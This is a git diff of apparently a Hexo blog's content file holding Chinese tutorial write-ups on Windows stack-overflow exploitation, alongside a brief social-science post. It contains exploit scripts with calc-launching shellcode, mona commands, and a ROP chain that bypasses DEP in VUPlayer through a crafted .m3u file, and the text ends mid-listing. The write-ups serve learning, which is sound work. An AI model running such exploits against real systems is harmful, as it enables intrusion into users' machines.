@@ -436,7 +436,6 @@
     <url>/2023/10/19/Exploitme/</url>
     <content><![CDATA[<p>参考链接</p>
 <ul>
-<li><a href="https://tttang.com/archive/901/">Exploit开发系列教程-Windows基础&amp;shellcode - 跳跳糖 (tttang.com)</a></li>
 <li><a href="https://tttang.com/archive/680/#toc_0x01-exploitme1-ret-eip-overwrite-more-space-on-stack">Exploit开发系列教程-Exploitme1 (“ret eip” overwrite) &amp;More space on stack - 跳跳糖 (tttang.com)</a></li>
 </ul>
 <span id="more"></span>
@@ -448,6 +447,7 @@
 <ul>
 <li>禁用安全检查 &#x2F;GS-（配置属性—&gt;C&#x2F;C++—&gt;代码生成—&gt;安全检查）</li>
 <li>关闭数据执行保护 &#x2F;NXCOMPAT:NO （配置属性—&gt;链接器—&gt;高级—&gt;数据执行保护(DEP)）</li>
+<li>关闭随机基址 &#x2F;DYNAMICBASE:NO （配置属性—&gt;链接器—&gt;高级—&gt;数据执行保护(DEP)）</li>
 </ul>
 </li>
 <li><p>技巧：</p>
@@ -511,7 +511,7 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0:000&gt; g</span><br><span class="line">(31e0.4f48): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=00000000 ebx=0067b000 ecx=0fce700e edx=755d0334 esi=00c868e8 edi=00c8c2a8</span><br><span class="line">eip=63636363 esp=008ff888 ebp=62626262 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246</span><br><span class="line">63636363 ??              ???</span><br></pre></td></tr></table></figure>
 
 <p>查看栈内存，我们希望cccc指向cccc之后的这块内存（当执行完main函数中的ret后，ESP寄存器的值刚好指向这里），我们会在这里填充shellcode。但由于ASLR（地址空间布局随机化，简称地址随机化），两次的ESP值不同，也就意味着我们无法将 cccc 替换为一个固定的地址。</p>
-<p>![aslr for stack](..&#x2F;pic&#x2F;Exploitme&#x2F;aslr for stack.png)</p>
+<p><img src="/../pic/Exploitme/aslr-for-stack.png" alt="aslr-for-stack"></p>
 <p>不过，可以将 cccc 替换为一个指向 jmp ESP 指令的地址（代码段的指令的地址是固定的），程序执行流就会变成</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ret ——&gt; jmp ESP --&gt; [shellcode]</span><br></pre></td></tr></table></figure>
 
@@ -537,6 +537,13 @@
 
 <p>之后在release模式下运行程序，成功执行<code>shellcode</code>，弹出了一个计算器：</p>
 <p><img src="/../pic/Exploitme/pwn.png" alt="pwn"></p>
+<h2 id="复现补充（栈空间不足解决方案）"><a href="#复现补充（栈空间不足解决方案）" class="headerlink" title="复现补充（栈空间不足解决方案）"></a>复现补充（栈空间不足解决方案）</h2><p>在一次复现的时候，出现以下情况，程序在执行<code>fread</code>的过程中出错（存在随机性）：</p>
+<p><img src="D:\Users\czx\NativeFiles\Desktop\blog\source\pic\Exploitme\fread_fault.png" alt="fread_fault"></p>
+<p>这可能是因为栈上的空间不足，<code>fread</code>在读入数据时将栈底覆盖，导致程序出错。</p>
+<p>解决方法为，将漏洞程序修改为：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"> </span><br><span class="line">_declspec(noinline) <span class="type">int</span> <span class="title function_">old_main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reading name from file...\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    FILE *f = fopen(<span class="string">&quot;D:\\Users\\czx\\NativeFiles\\Desktop\\tmp\\name.dat&#x27;, &quot;</span>rb<span class="string">&quot;);</span></span><br><span class="line"><span class="string">    if (!f)</span></span><br><span class="line"><span class="string">        return -1;</span></span><br><span class="line"><span class="string">    fseek(f, 0L, SEEK_END);</span></span><br><span class="line"><span class="string">    long bytes = ftell(f);</span></span><br><span class="line"><span class="string">    fseek(f, 0L, SEEK_SET);</span></span><br><span class="line"><span class="string">    fread(name, 1, bytes, f);</span></span><br><span class="line"><span class="string">    name[bytes] = &#x27;\0&#x27;;</span></span><br><span class="line"><span class="string">    fclose(f);</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    printf(&quot;</span>Hi, %s!\n<span class="string">&quot;, name);</span></span><br><span class="line"><span class="string">    return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// (1)(2)两点都是用来禁用优化的，有时候只用其中一个就能起到效果，有时候需要两个一起(取决于VS版本)</span></span><br><span class="line"><span class="string">#pragma optimize( &quot;</span><span class="string">&quot;, off )  // (1)关闭编译器优化</span></span><br><span class="line"><span class="string">int main() &#123;</span></span><br><span class="line"><span class="string">    char moreStack[10000];</span></span><br><span class="line"><span class="string">    for (int i = 0; i &lt; sizeof(moreStack); ++i)  // (2)for循环中使用moreStack避免它被优化</span></span><br><span class="line"><span class="string">        moreStack[i] = i;</span></span><br><span class="line"><span class="string">    return old_main();</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>之后，再次运行，便可成功弹出计算器。</p>
 ]]></content>
       <categories>
         <category>Windows-PWN</category>
@@ -647,8 +654,69 @@
       </categories>
   </entry>
   <entry>
+    <title>Exploitme2——Stack cookies &amp; SEH</title>
+    <url>/2023/10/24/Exploitme2/</url>
+    <content><![CDATA[<p>参考链接：</p>
+<ul>
+<li><a href="https://juejin.cn/post/6844903572509818887">Exploit开发系列教程-Exploitme2 (Stack cookies &amp; SEH) - 掘金 (juejin.cn)</a></li>
+</ul>
+<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ul>
+<li>Visual Studio配置<ul>
+<li>关闭<code>DEP</code>: <ul>
+<li>链接器<code>DEP</code> (<code>/NXCOMPAT:NO</code>)（配置属性—&gt;链接器—&gt;高级—&gt;数据执行保护(DEP)）</li>
+<li>操作系统<code>DEP</code>(如果开着记得关了)：(WIN10下：设置—系统—关于—高级系统设置—性能-设置—数据执行保护—选中“DEP(T)”）</li>
+</ul>
+</li>
+<li>关闭随机基址(<code>/DYNAMICBASE:NO</code>) （配置属性—&gt;链接器—&gt;高级—&gt;数据执行保护(DEP)）</li>
+<li>关闭<code>/SDL</code>检查(<code>/sdl-</code>)：配置属性—&gt;C&#x2F;C++—&gt;常规—&gt;SDL检查）</li>
+<li>开启安全检查(<code>/GS-</code>) : （配置属性—&gt;C&#x2F;C++—&gt;代码生成—&gt;安全检查）</li>
+</ul>
+</li>
+</ul>
+<h2 id="开始实验"><a href="#开始实验" class="headerlink" title="开始实验"></a>开始实验</h2><h3 id="重复实验"><a href="#重复实验" class="headerlink" title="重复实验"></a>重复实验</h3><p>重复<a href="https://czxvan.github.io/2023/10/19/Exploitme/">Exploitme</a>中的实验（先确认关闭<code>/GS</code>时，可成功运行，然后打开<code>/GS</code>）</p>
+<p>漏洞程序：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"> </span><br><span class="line">_declspec(noinline) <span class="type">int</span> <span class="title function_">old_main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reading name from file...\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    FILE *f = fopen(<span class="string">&quot;D:\\Users\\czx\\NativeFiles\\Desktop\\tmp\\name.dat&#x27;, &quot;</span>rb<span class="string">&quot;);</span></span><br><span class="line"><span class="string">    if (!f)</span></span><br><span class="line"><span class="string">        return -1;</span></span><br><span class="line"><span class="string">    fseek(f, 0L, SEEK_END);</span></span><br><span class="line"><span class="string">    long bytes = ftell(f);</span></span><br><span class="line"><span class="string">    fseek(f, 0L, SEEK_SET);</span></span><br><span class="line"><span class="string">    fread(name, 1, bytes, f);</span></span><br><span class="line"><span class="string">    name[bytes] = &#x27;\0&#x27;;</span></span><br><span class="line"><span class="string">    fclose(f);</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    printf(&quot;</span>Hi, %s!\n<span class="string">&quot;, name);</span></span><br><span class="line"><span class="string">    return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">                    </span></span><br><span class="line"><span class="string">#pragma optimize( &quot;</span><span class="string">&quot;, off )</span></span><br><span class="line"><span class="string">int main() &#123;</span></span><br><span class="line"><span class="string">    char moreStack[10000];</span></span><br><span class="line"><span class="string">    for (int i = 0; i &lt; sizeof(moreStack); ++i)</span></span><br><span class="line"><span class="string">        moreStack[i] = i;</span></span><br><span class="line"><span class="string">    return old_main();</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>windbg</code>下<code>mona</code>搜索<code>jmp esp</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">.load pykd</span><br><span class="line">!py mona j -r esp -m &quot;ntdll&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">虽然Exploitme模块关闭了ASLR，但它里面没有符合要求的指令。我们还是得用默认开启了ASLR的系统模块，且每次重启电脑都要重新寻找。</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x7755ce33 |   0x7755ce33 (b+0x0010ce33)  : call esp </span><br></pre></td></tr></table></figure>
+
+<p><code>exp.py</code>:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python3</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;D:\\Users\\czx\\NativeFiles\\Desktop\\tmp\\name.dat&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ret_eip = <span class="string">b&#x27;\x33\xce\x55\x77&#x27;</span>	<span class="comment"># 小端序</span></span><br><span class="line">    shellcode = (<span class="string">b&quot;\xe8\xff\xff\xff\xff\xc0\x5f\xb9\x11\x03\x02\x02\x81\xf1\x02\x02&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x02\x02\x83\xc7\x1d\x33\xf6\xfc\x8a\x07\x3c\x02\x0f\x44\xc6\xaa&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xe2\xf6\x55\x8b\xec\x83\xec\x0c\x56\x57\xb9\x7f\xc0\xb4\x7b\xe8&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x55\x02\x02\x02\xb9\xe0\x53\x31\x4b\x8b\xf8\xe8\x49\x02\x02\x02&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x8b\xf0\xc7\x45\xf4\x63\x61\x6c\x63\x6a\x05\x8d\x45\xf4\xc7\x45&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xf8\x2e\x65\x78\x65\x50\xc6\x45\xfc\x02\xff\xd7\x6a\x02\xff\xd6&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x5f\x33\xc0\x5e\x8b\xe5\x5d\xc3\x33\xd2\xeb\x10\xc1\xca\x0d\x3c&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x61\x0f\xbe\xc0\x7c\x03\x83\xe8\x20\x03\xd0\x41\x8a\x01\x84\xc0&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x75\xea\x8b\xc2\xc3\x8d\x41\xf8\xc3\x55\x8b\xec\x83\xec\x14\x53&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x56\x57\x89\x4d\xf4\x64\xa1\x30\x02\x02\x02\x89\x45\xfc\x8b\x45&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xfc\x8b\x40\x0c\x8b\x40\x14\x8b\xf8\x89\x45\xec\x8b\xcf\xe8\xd2&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xff\xff\xff\x8b\x3f\x8b\x70\x18\x85\xf6\x74\x4f\x8b\x46\x3c\x8b&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x5c\x30\x78\x85\xdb\x74\x44\x8b\x4c\x33\x0c\x03\xce\xe8\x96\xff&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xff\xff\x8b\x4c\x33\x20\x89\x45\xf8\x03\xce\x33\xc0\x89\x4d\xf0&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x89\x45\xfc\x39\x44\x33\x18\x76\x22\x8b\x0c\x81\x03\xce\xe8\x75&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xff\xff\xff\x03\x45\xf8\x39\x45\xf4\x74\x1e\x8b\x45\xfc\x8b\x4d&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xf0\x40\x89\x45\xfc\x3b\x44\x33\x18\x72\xde\x3b\x7d\xec\x75\x9c&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x33\xc0\x5f\x5e\x5b\x8b\xe5\x5d\xc3\x8b\x4d\xfc\x8b\x44\x33\x24&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x8d\x04\x48\x0f\xb7\x0c\x30\x8b\x44\x33\x1c\x8d\x04\x88\x8b\x04&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x30\x03\xc6\xeb\xdd&quot;</span>)</span><br><span class="line">    name = <span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">4</span> + ret_eip + shellcode</span><br><span class="line">    f.write(name)</span><br></pre></td></tr></table></figure>
+
+<p>运行</p>
+]]></content>
+      <categories>
+        <category>Windows-PWN</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Create a Plugin for Immunity Debugger</title>
+    <url>/2023/10/23/Create-a-Plugin-for-Immunity-Debugger/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>社科知识</title>
+    <url>/2023/10/23/%E7%A4%BE%E7%A7%91%E7%9F%A5%E8%AF%86/</url>
+    <content><![CDATA[<p>介绍一些基础的社科知识，主要包括源自启蒙时代的一系列概念，以及一些我认为有价值的观点的介绍。</p>
+<span id="more"></span>
+
+
+
+<p><a href="https://www.zhihu.com/question/626921129/answer/3258747740?utm_campaign=&utm_medium=social&utm_oi=1323630258282000384&utm_psn=1699919819036532736&utm_source=qq">马克思对人性的观点</a></p>
+<ul>
+<li>民主程度，取决于民众对官僚的威慑力度。</li>
+<li>人性随生产力变化而变化，制度随生产力变化而变化；而不是不变的人性形成不变的制度。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>社科知识</category>
+      </categories>
+  </entry>
+  <entry>
     <title>Exploitme——ROP</title>
-    <url>/2023/10/20/Exploitme2/</url>
+    <url>/2023/10/20/Exploitme-ROP/</url>
     <content><![CDATA[<p>当程序开启数据执行保护（DEP）后，我们无法在栈上执行<code>shellcode</code>，但可以利用程序中自带的代码片段（gadget），使<code>ret</code>指令和栈数据相配合，将 <code>gadget</code>串成一串，也能起到<code>shellcode</code>的效果，这就是返回导向编程<code>ROP</code>。</p>
 <p>参考链接：</p>
 <ul>
@@ -680,25 +748,25 @@
 
 <p>打开VUPlayer，选择<code>file--&gt;open playlist</code>，选中<code>test.m3u</code>，发现<code>VUPlayer</code>闪退。</p>
 <p>使用windbg打开，将<code>test.m3u</code>拖入<code>VUPlayer</code>，发现 EIP 被 0x41414141 覆盖，确定存在栈溢出漏洞</p>
-<p><img src="/../pic/Exploitme2/EIP41414141.png" alt="EIP41414141"></p>
+<p><img src="/../pic/Exploitme-ROP/EIP41414141.png" alt="EIP41414141"></p>
 <h3 id="确认偏移量"><a href="#确认偏移量" class="headerlink" title="确认偏移量"></a>确认偏移量</h3><p>在windbg中输入以下命令</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">.load pykd</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">!py mona pattern_create 3000</span><br><span class="line">或者</span><br><span class="line">!py mona pc 3000</span><br></pre></td></tr></table></figure>
 
 <p>将得到的3000个字符拷贝到<code>test.m3u</code>文件，重复之前的操作，得到</p>
-<p><img src="/../pic/Exploitme2/EIPpattern.png" alt="EIPpattern"></p>
+<p><img src="/../pic/Exploitme-ROP/EIPpattern.png" alt="EIPpattern"></p>
 <p>之后执行以下命令，确定偏移量（偏移量指输入点距栈中返回地址之间的字节数）：</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">!py mona pattern_offset 68423768</span><br><span class="line">或</span><br><span class="line">!py mona po 0x68423768  # 0x可以省略</span><br></pre></td></tr></table></figure>
 
 <p>得到</p>
-<p><img src="/../pic/Exploitme2/mona_po.png" alt="mona_po"></p>
+<p><img src="/../pic/Exploitme-ROP/mona_po.png" alt="mona_po"></p>
 <p>确定偏移量为 1012 。</p>
 <p>使用以下脚本，重复操作，测试偏移量是否正确：</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">payload = &quot;A&quot;*1012 + &quot;B&quot;*4</span><br><span class="line">file = open(&#x27;test.m3u&#x27;,&#x27;w&#x27;)</span><br><span class="line">file.write(payload)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>
 
 <p>看到 EIP 成功被 0x42424242 覆盖，偏移量正确</p>
-<p><img src="/../pic/Exploitme2/EIP42424242.png" alt="EIP42424242"></p>
+<p><img src="/../pic/Exploitme-ROP/EIP42424242.png" alt="EIP42424242"></p>
 <h3 id="直接在栈上执行shellcode"><a href="#直接在栈上执行shellcode" class="headerlink" title="直接在栈上执行shellcode"></a>直接在栈上执行shellcode</h3><h4 id="搜索跳转指令"><a href="#搜索跳转指令" class="headerlink" title="搜索跳转指令"></a>搜索跳转指令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!py mona j -r esp</span><br></pre></td></tr></table></figure>
 
 <p>得到以下输出</p>
@@ -708,7 +776,7 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">1012</span> + <span class="string">b&quot;\x9f\x53\x10\x10&quot;</span> + <span class="string">b&quot;\xcc&quot;</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;test.m3u&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">file.write(payload)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>
 
 <p>在windbg下打开<code>VMPlayer</code>，拖入<code>test.m3u</code>文件，得到以下结果：</p>
-<p><img src="/../pic/Exploitme2/DEP_c0000005.png" alt="dep_red"></p>
+<p><img src="/../pic/Exploitme-ROP/DEP_c0000005.png" alt="dep_red"></p>
 <p>说明开启了<code>DEP</code>防护，无法直接执行shellcode。</p>
 <h3 id="构造ROP使用绕过DEP"><a href="#构造ROP使用绕过DEP" class="headerlink" title="构造ROP使用绕过DEP"></a>构造ROP使用绕过DEP</h3><p>我们需要使用<code>ROP</code>调用<code>VirtualProtect</code>函数，以关闭shellcode所在页的<code>DEP</code>保护。</p>
 <h4 id="VirtualProtect"><a href="#VirtualProtect" class="headerlink" title="VirtualProtect"></a>VirtualProtect</h4><p>首先介绍VirtualProtect函数</p>
@@ -727,12 +795,12 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">!py mona rop -m <span class="string">&quot;bass,basswma,bassmidi&quot;</span> -cp nonull</span><br></pre></td></tr></table></figure>
 
 <p><code>immunity debugger</code>下执行以下命令：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">!mona config -set workingfolder D:\Users\czx\NativeFiles\Desktop\blog\code\Exploitme2\mona-log</span><br><span class="line">!mona rop -m &quot;bass,basswma,bassmidi&quot; -cp nonull</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">!mona config -set workingfolder D:\Users\czx\NativeFiles\Desktop\blog\code\Exploitme-ROP\mona-log</span><br><span class="line">!mona rop -m &quot;bass,basswma,bassmidi&quot; -cp nonull</span><br></pre></td></tr></table></figure>
 
 <p>成功执行，输出信息如下：</p>
-<p><img src="/../pic/Exploitme2/immu-mona-rop.png" alt="immu-mona-rop"></p>
+<p><img src="/../pic/Exploitme-ROP/immu-mona-rop.png" alt="immu-mona-rop"></p>
 <p>在日志目录下生成了以下几个文件：</p>
-<p><img src="/../pic/Exploitme2/mona-log.png" alt="mona-log"></p>
+<p><img src="/../pic/Exploitme-ROP/mona-log.png" alt="mona-log"></p>
 <p>查看<code>rop_chains.txt</code>，其中包含建议使用的<code>rop_chain</code>：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Register setup for VirtualProtect() :</span><br><span class="line">--------------------------------------------</span><br><span class="line"> EAX = NOP (0x90909090)</span><br><span class="line"> ECX = lpOldProtect (ptr to W address)</span><br><span class="line"> EDX = NewProtect (0x40)</span><br><span class="line"> EBX = dwSize</span><br><span class="line"> ESP = lPAddress (automatic)</span><br><span class="line"> EBP = ReturnTo (ptr to jmp esp)</span><br><span class="line"> ESI = ptr to VirtualProtect()</span><br><span class="line"> EDI = ROP NOP (RETN)</span><br><span class="line"> --- alternative chain ---</span><br><span class="line"> EAX = ptr to &amp;VirtualProtect()</span><br><span class="line"> ECX = lpOldProtect (ptr to W address)</span><br><span class="line"> EDX = NewProtect (0x40)</span><br><span class="line"> EBX = dwSize</span><br><span class="line"> ESP = lPAddress (automatic)</span><br><span class="line"> EBP = POP (skip 4 bytes)</span><br><span class="line"> ESI = ptr to JMP [EAX]</span><br><span class="line"> EDI = ROP NOP (RETN)</span><br><span class="line"> + place ptr to &quot;jmp esp&quot; on stack, below PUSHAD</span><br><span class="line"> ...</span><br><span class="line"> def create_rop_chain():</span><br><span class="line">    # rop chain generated with mona.py - www.corelan.be</span><br><span class="line">    rop_gadgets = [</span><br><span class="line">      #[---INFO:gadgets_to_set_esi:---]</span><br><span class="line">      0x10015f82,  # POP EAX # RETN [BASS.dll] </span><br><span class="line">      0x1060e25c,  # ptr to &amp;VirtualProtect() [IAT BASSMIDI.dll]</span><br><span class="line">      0x1001eaf1,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [BASS.dll] </span><br><span class="line">      0x10030950,  # XCHG EAX,ESI # RETN [BASS.dll] </span><br><span class="line">      #[---INFO:gadgets_to_set_ebp:---]</span><br><span class="line">      </span><br><span class="line">      0x1001d748,  # POP EBP # RETN [BASS.dll] </span><br><span class="line">      0x1010539f,  # &amp; jmp esp [BASSWMA.dll]</span><br><span class="line">      #[---INFO:gadgets_to_set_ebx:---]</span><br><span class="line">      0x10015f77,  # POP EAX # RETN [BASS.dll] </span><br><span class="line">      0xfffffdff,  # Value to negate, will become 0x00000201</span><br><span class="line">      0x10014db4,  # NEG EAX # RETN [BASS.dll] </span><br><span class="line">      0x10032f32,  # XCHG EAX,EBX # RETN 0x00 [BASS.dll] </span><br><span class="line">      #[---INFO:gadgets_to_set_edx:---]</span><br><span class="line">      0x10015fe7,  # POP EAX # RETN [BASS.dll] </span><br><span class="line">      0xffffffc0,  # Value to negate, will become 0x00000040</span><br><span class="line">      0x10014db4,  # NEG EAX # RETN [BASS.dll] </span><br><span class="line">      0x10038a6d,  # XCHG EAX,EDX # RETN [BASS.dll] </span><br><span class="line">      #[---INFO:gadgets_to_set_ecx:---]</span><br><span class="line">      0x101012e0,  # POP ECX # RETN [BASSWMA.dll] </span><br><span class="line">      0x1003f0cc,  # &amp;Writable location [BASS.dll]</span><br><span class="line">      #[---INFO:gadgets_to_set_edi:---]</span><br><span class="line">      0x10603658,  # POP EDI # RETN [BASSMIDI.dll] </span><br><span class="line">      0x1001dc05,  # RETN (ROP NOP) [BASS.dll]</span><br><span class="line">      #[---INFO:gadgets_to_set_eax:---]</span><br><span class="line">      0x10015fe7,  # POP EAX # RETN [BASS.dll] </span><br><span class="line">      0x90909090,  # nop</span><br><span class="line">      #[---INFO:pushad:---]</span><br><span class="line">      0x1001d7a5,  # PUSHAD # RETN [BASS.dll] </span><br><span class="line">    ]</span><br><span class="line">    return &#x27;&#x27;.join(struct.pack(&#x27;&lt;I&#x27;, _) for _ in rop_gadgets)</span><br><span class="line"></span><br><span class="line">rop_chain = create_rop_chain()</span><br></pre></td></tr></table></figure>
 
@@ -751,7 +819,7 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_rop_chain</span>():</span><br><span class="line">    <span class="comment"># rop chain generated with mona.py - www.corelan.be</span></span><br><span class="line">    rop_gadgets = [</span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_esi:---]</span></span><br><span class="line">      <span class="number">0x10015f82</span>,  <span class="comment"># POP EAX # RETN [BASS.dll] </span></span><br><span class="line">      <span class="number">0x1060e25c</span>,  <span class="comment"># ptr to &amp;VirtualProtect() [IAT BASSMIDI.dll]</span></span><br><span class="line">      <span class="number">0x1001eaf1</span>,  <span class="comment"># MOV EAX,DWORD PTR DS:[EAX] # RETN [BASS.dll] </span></span><br><span class="line">      <span class="number">0x10030950</span>,  <span class="comment"># XCHG EAX,ESI # RETN [BASS.dll] </span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_ebp:---]</span></span><br><span class="line">      <span class="number">0x1001d748</span>,  <span class="comment"># POP EBP # RETN [BASS.dll] </span></span><br><span class="line">      <span class="number">0x1010539f</span>,  <span class="comment"># &amp; jmp esp [BASSWMA.dll]</span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_ebx:---]</span></span><br><span class="line">      <span class="number">0x10015f77</span>,  <span class="comment"># POP EAX # RETN [BASS.dll] </span></span><br><span class="line">      <span class="number">0xfffffdff</span>,  <span class="comment"># Value to negate, will become 0x00000201</span></span><br><span class="line">      <span class="number">0x10014db4</span>,  <span class="comment"># NEG EAX # RETN [BASS.dll] </span></span><br><span class="line">      <span class="number">0x10032f32</span>,  <span class="comment"># XCHG EAX,EBX # RETN 0x00 [BASS.dll] </span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_edx:---]</span></span><br><span class="line">      <span class="number">0x10015fe7</span>,  <span class="comment"># POP EAX # RETN [BASS.dll] </span></span><br><span class="line">      <span class="number">0xffffffc0</span>,  <span class="comment"># Value to negate, will become 0x00000040</span></span><br><span class="line">      <span class="number">0x10014db4</span>,  <span class="comment"># NEG EAX # RETN [BASS.dll] </span></span><br><span class="line">      <span class="number">0x10038a6d</span>,  <span class="comment"># XCHG EAX,EDX # RETN [BASS.dll] </span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_ecx:---]</span></span><br><span class="line">      <span class="number">0x101012e0</span>,  <span class="comment"># POP ECX # RETN [BASSWMA.dll] </span></span><br><span class="line">      <span class="number">0x1003f0cc</span>,  <span class="comment"># &amp;Writable location [BASS.dll]</span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_edi:---]</span></span><br><span class="line">      <span class="number">0x10603658</span>,  <span class="comment"># POP EDI # RETN [BASSMIDI.dll] </span></span><br><span class="line">      <span class="number">0x1001dc05</span>,  <span class="comment"># RETN (ROP NOP) [BASS.dll]</span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_eax:---]</span></span><br><span class="line">      <span class="number">0x10015fe7</span>,  <span class="comment"># POP EAX # RETN [BASS.dll] </span></span><br><span class="line">      <span class="number">0x90909090</span>,  <span class="comment"># nop</span></span><br><span class="line">      <span class="comment">#[---INFO:pushad:---]</span></span><br><span class="line">      <span class="number">0x1001d7a5</span>,  <span class="comment"># PUSHAD # RETN [BASS.dll] </span></span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span>.join(struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, _) <span class="keyword">for</span> _ <span class="keyword">in</span> rop_gadgets)</span><br><span class="line">    </span><br><span class="line">rop_chain = create_rop_chain()</span><br><span class="line">shellcode = (<span class="string">b&quot;\xe8\xff\xff\xff\xff\xc0\x5f\xb9\x11\x03\x02\x02\x81\xf1\x02\x02&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x02\x02\x83\xc7\x1d\x33\xf6\xfc\x8a\x07\x3c\x02\x0f\x44\xc6\xaa&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xe2\xf6\x55\x8b\xec\x83\xec\x0c\x56\x57\xb9\x7f\xc0\xb4\x7b\xe8&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x55\x02\x02\x02\xb9\xe0\x53\x31\x4b\x8b\xf8\xe8\x49\x02\x02\x02&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x8b\xf0\xc7\x45\xf4\x63\x61\x6c\x63\x6a\x05\x8d\x45\xf4\xc7\x45&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xf8\x2e\x65\x78\x65\x50\xc6\x45\xfc\x02\xff\xd7\x6a\x02\xff\xd6&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x5f\x33\xc0\x5e\x8b\xe5\x5d\xc3\x33\xd2\xeb\x10\xc1\xca\x0d\x3c&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x61\x0f\xbe\xc0\x7c\x03\x83\xe8\x20\x03\xd0\x41\x8a\x01\x84\xc0&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x75\xea\x8b\xc2\xc3\x8d\x41\xf8\xc3\x55\x8b\xec\x83\xec\x14\x53&quot;</span>+</span><br><span class="line">        <span 